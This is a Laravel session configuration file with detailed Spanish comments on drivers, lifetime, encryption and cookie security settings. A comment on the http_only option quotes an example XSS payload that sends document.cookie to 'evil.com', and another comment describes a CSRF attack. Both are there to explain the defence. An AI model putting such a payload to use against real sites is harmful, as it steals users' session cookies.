<?php

use Illuminate\Support\Str;

return [

    /*
    |--------------------------------------------------------------------------
    | Driver de Sesión Predeterminado
    |--------------------------------------------------------------------------
    |
    | Define cómo se almacenan las sesiones de los usuarios. Cada opción
    | tiene diferentes características de seguridad y rendimiento.
    |
    | Opciones disponibles:
    | - "file"       → Archivos en disco (desarrollo local)
    | - "cookie"     → Datos en cookies del navegador (sin BD)
    | - "database"   → Tabla 'sessions' en BD (recomendado para producción)
    | - "memcached"  → Caché en memoria (alto rendimiento)
    | - "redis"      → Caché Redis (distribuido)
    | - "dynamodb"   → AWS DynamoDB (serverless)
    | - "array"      → Memoria (solo para testing)
    |
    */

    'driver' => env('SESSION_DRIVER', 'database'),

    /*
    |--------------------------------------------------------------------------
    | Duración de la Sesión
    |--------------------------------------------------------------------------
    |
    | Especifica cuántos MINUTOS de inactividad puede tener una sesión
    | antes de expirar automáticamente. Después de este tiempo sin
    | actividad, el usuario debe volver a autenticarse.
    |
    | Ejemplo: 120 = la sesión expira después de 2 horas sin usar la app
    |
    | Nota: 'expire_on_close' determina si expira al cerrar el navegador
    |
    */

    'lifetime' => (int) env('SESSION_LIFETIME', 120),

    /*
    |--------------------------------------------------------------------------
    | Expiración al Cerrar Navegador
    |--------------------------------------------------------------------------
    |
    | Si es 'true': la sesión se elimina cuando cierras el navegador
    |               (cookie de sesión, sin persistencia en BD)
    | Si es 'false': la sesión persiste aunque cierres el navegador
    |                (se guarda en BD hasta que expire por 'lifetime')
    |
    */

    'expire_on_close' => env('SESSION_EXPIRE_ON_CLOSE', false),

    /*
    |--------------------------------------------------------------------------
    | Encriptación de Sesión
    |--------------------------------------------------------------------------
    |
    | Si es 'true': Laravel encripta TODOS los datos de la sesión
    |               antes de almacenarlos (payload en base64 + encriptado)
    | Si es 'false': solo serializa sin encriptación adicional
    |
    | Recomendación: 'true' en producción para máxima seguridad
    | El payload se encripta con APP_KEY del archivo .env
    |
    */

    'encrypt' => env('SESSION_ENCRYPT', true),

    /*
    |--------------------------------------------------------------------------
    | Ubicación de Archivos de Sesión
    |--------------------------------------------------------------------------
    |
    | Solo se usa si 'driver' es "file".
    | Define dónde se almacenan los archivos de sesión en disco.
    |
    | Ruta por defecto: /storage/framework/sessions/
    |
    */

    'files' => storage_path('framework/sessions'),

    /*
    |--------------------------------------------------------------------------
    | Conexión a Base de Datos para Sesiones
    |--------------------------------------------------------------------------
    |
    | Si 'driver' es "database" o "redis", especifica qué conexión de BD usar.
    | Normalmente se deja vacío para usar la conexión default (pgsql/mysql).
    |
    | Si no se define: usa la conexión default configurada en config/database.php
    |
    | Ejemplo en .env:
    | SESSION_CONNECTION=pgsql  → Usa la conexión PostgreSQL
    |
    */

    'connection' => env('SESSION_CONNECTION'),

    /*
    |--------------------------------------------------------------------------
    | Tabla de Base de Datos para Sesiones
    |--------------------------------------------------------------------------
    |
    | Especifica el nombre de la tabla donde se almacenan las sesiones.
    | Por defecto: 'sessions'
    |
    | La tabla debe tener la estructura:
    | - id (varchar 255, PK)
    | - user_id (uuid, FK a users.id)
    | - ip_address (varchar 45)
    | - user_agent (text)
    | - payload (text encriptado)
    | - last_activity (integer timestamp)
    |
    */

    'table' => env('SESSION_TABLE', 'sessions'),

    /*
    |--------------------------------------------------------------------------
    | Almacén de Caché para Sesiones
    |--------------------------------------------------------------------------
    |
    | Solo se usa si 'driver' es "dynamodb", "memcached" o "redis".
    | Define qué almacén de caché usar para guardar sesiones.
    |
    | Debe corresponder con un nombre en config/cache.php
    |
    */

    'store' => env('SESSION_STORE'),

    /*
    |--------------------------------------------------------------------------
    | Limpieza Automática de Sesiones (Garbage Collection)
    |--------------------------------------------------------------------------
    |
    | Probabilidad de ejecutar limpieza de sesiones expiradas en cada request.
    | Valor: [numerador, denominador] = [2, 100] = 2% de probabilidad
    |
    | Cuando gana la lotería, Laravel ejecuta:
    | DELETE FROM sessions WHERE last_activity < (ahora - lifetime)
    |
    | Esto previene que la tabla 'sessions' crezca indefinidamente.
    | Las sesiones expiradas se eliminan automáticamente.
    |
    */

    'lottery' => [2, 100],

    /*
    |--------------------------------------------------------------------------
    | Nombre de la Cookie de Sesión
    |--------------------------------------------------------------------------
    |
    | Define el nombre de la cookie que almacena el session ID en el navegador.
    | Esta cookie es enviada en cada request para identificar la sesión.
    |
    | Valor por defecto: 'APP_NAME-session' (ej: 'tasks-app-session')
    |
    | La cookie contiene el ID de sesión (ej: KNmJ3vqruhMk6LaK...)
    | que Laravel usa para buscar los datos en la tabla 'sessions'
    |
    */

    'cookie' => env(
        'SESSION_COOKIE',
        Str::slug((string) env('APP_NAME', 'laravel')).'-session'
    ),

    /*
    |--------------------------------------------------------------------------
    | Ruta de la Cookie de Sesión
    |--------------------------------------------------------------------------
    |
    | Define en qué rutas del sitio se envía la cookie.
    | '/' = se envía en TODAS las rutas
    | '/admin' = se envía solo en rutas que comienzan con /admin
    |
    | Por defecto: '/' (cookie disponible en todo el sitio)
    |
    */

    'path' => env('SESSION_PATH', '/'),

    /*
    |--------------------------------------------------------------------------
    | Dominio de la Cookie de Sesión
    |--------------------------------------------------------------------------
    |
    | Define a qué dominio pertenece la cookie.
    | Vacío (null) = solo el dominio actual (localhost, ejemplo.com, etc)
    | '.ejemplo.com' = funciona en ejemplo.com y api.ejemplo.com
    |
    | En desarrollo: dejar vacío (null)
    | En producción: puede especificarse para subdomios
    |
    */

    'domain' => env('SESSION_DOMAIN'),

    /*
    |--------------------------------------------------------------------------
    | Cookie Solo HTTPS
    |--------------------------------------------------------------------------
    |
    | Si es 'true': la cookie se envía SOLO si la conexión es HTTPS
    |              (previene robo de sesión en conexiones sin encriptar)
    | Si es 'false': la cookie se envía en HTTP y HTTPS
    |
    | Recomendación:
    | - Desarrollo: false (localhost sin HTTPS)
    | - Producción: true (requiere HTTPS obligatorio)
    |
    | Ataque que previene: Man-in-the-Middle (MITM) en redes públicas
    |
    */

    'secure' => env('SESSION_SECURE_COOKIE', false),

    /*
    |--------------------------------------------------------------------------
    | Cookie Solo HTTP (Sin Acceso JavaScript)
    |--------------------------------------------------------------------------
    |
    | Si es 'true': JavaScript NO puede acceder a la cookie
    |              (document.cookie no la ve)
    |              solo se envía automáticamente en requests HTTP
    | Si es 'false': JavaScript PUEDE leer la cookie
    |               (RIESGO: vulnerable a XSS)
    |
    | Recomendación: SIEMPRE 'true' (seguridad contra ataques XSS)
    |
    | Ataque que previene: Cross-Site Scripting (XSS)
    | Ejemplo de ataque sin HttpOnly:
    | <script>fetch('evil.com?cookie=' + document.cookie);</script>
    |
    */

    'http_only' => env('SESSION_HTTP_ONLY', true),

    /*
    |--------------------------------------------------------------------------
    | Cookies Same-Site
    |--------------------------------------------------------------------------
    |
    | Controla si la cookie se envía en requests cross-site (de otros sitios).
    |
    | Opciones:
    | - "lax"     → La cookie se envía en navegación top-level (links, redirects)
    |              pero NO en AJAX/Fetch desde otros sitios (RECOMENDADO)
    | - "strict"  → La cookie NUNCA se envía cross-site
    |              (máxima seguridad, pero puede romper integraciones)
    | - "none"    → La cookie SIEMPRE se envía (requiere 'secure' = true)
    |              (solo para APIs públicas con HTTPS)
    | - null      → Comportamiento por defecto del navegador (no recomendado)
    |
    | Ataque que previene: Cross-Site Request Forgery (CSRF)
    |
    | Ejemplo de CSRF sin SameSite=Lax:
    | Usuario en tasks-app.com (logueado)
    |   → Visita evil-site.com
    |   → evil-site.com hace POST a tasks-app.com/tasks/delete
    |   → La cookie se envía automáticamente
    |   → La tarea se borra sin consentimiento del usuario
    |
    */

    'same_site' => env('SESSION_SAME_SITE', 'lax'),

    /*
    |--------------------------------------------------------------------------
    | Cookies Particionadas (CHIPS)
    |--------------------------------------------------------------------------
    |
    | Si es 'true': la cookie se particiona por sitio top-level
    |              (cada sitio tiene su propia copia de la cookie)
    |              Previene tracking cross-site
    | Si es 'false': comportamiento normal (cookies globales)
    |
    | Nota: Esta es una especificación experimental y nuevas.
    | Solo usar si tienes integraciones cross-site avanzadas.
    |
    | Recomendación: false para la mayoría de aplicaciones
    |
    */

    'partitioned' => env('SESSION_PARTITIONED_COOKIE', false),

    /*
    |--------------------------------------------------------------------------
    | Serialización de Datos de Sesión
    |--------------------------------------------------------------------------
    |
    | Define cómo se codifican los datos antes de almacenarlos.
    |
    | Opciones:
    | - "json"  → Datos se serializan como JSON (recomendado)
    |            Mayor seguridad, no permite objetos PHP complejos
    | - "php"   → Datos se serializan con serialize() de PHP
    |            Permite objetos PHP, pero riesgo de "gadget chain attacks"
    |            si APP_KEY se compromete
    |
    | Recomendación: "json" para máxima seguridad
    |
    | Nota: Si cambias esto, las sesiones antiguas serán incompatibles
    |
    */

    'serialization' => 'json',

];
